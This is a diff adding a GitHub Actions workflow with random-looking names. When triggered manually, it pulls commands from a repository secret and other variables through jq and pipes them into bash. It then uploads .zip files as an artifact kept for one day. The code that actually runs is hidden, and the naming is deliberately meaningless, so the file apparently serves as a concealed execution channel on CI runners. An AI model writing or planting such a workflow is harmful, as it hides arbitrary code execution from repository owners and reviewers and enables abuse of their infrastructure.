@@ -1,0 +1,28 @@
+name: jasmine9865ceo
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jasmine9865ceo
+        env:
+          sfiku6: ${{ secrets.sfiku6 }}
+        run: |
+          printf '%s' "$sfiku6" | jq -r .im021 | /bin/bash
+          printf '%s' "$fvecn061" | jq -r .jl04651 | /bin/bash
+          echo $fvgy55 | jq -r .x9 | /bin/bash
+          echo $sn855 | jq -r .zwfl1798 | /bin/bash
+          echo $jegch9271 | jq -r .u9117 | /bin/bash
+          printf '%s' "$ykxs4549" | jq -r .fl65181 | /bin/bash
+          echo $gbqk739 | jq -r .wxk05 | /bin/bash
+          echo $mrs5 | jq -r .k3188 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: p7Ww1NFN
+          path: "*.zip"
+          retention-days: 1
